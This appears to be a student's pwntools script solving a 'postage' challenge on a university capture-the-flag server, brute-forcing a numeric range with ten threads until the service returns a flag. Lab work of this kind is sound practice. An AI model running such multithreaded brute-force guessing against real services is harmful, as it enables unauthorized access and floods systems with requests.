from pwn import *
import re
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor

UPPER_BOUND = 6296106
LOWER_BOUND = 4194304
THREADS = 10

def req(i):

    r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1247)
    NETID = "cg4053"
    r.sendline(NETID.encode())
    while True:
        line = r.recvline().decode().strip()
        print(line)
        if "postage" in line:
            break
    r.sendline(str(i).encode())
    print('----------------- Current number is:  '+str(i))
    try:
        response = r.recvline().decode()
        print(response)
        if "flag" in response:
            print("*******************found the flag!****************")
            with open('postage_flag.txt','w') as f:
                f.write(str(response))
                exit(0)
    except EOFError:
        print(f"Connection closed unexpectedly when i was {i}")


if __name__ == '__main__':
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in tqdm(range(UPPER_BOUND, LOWER_BOUND, -1)):
            executor.submit(req, i)
   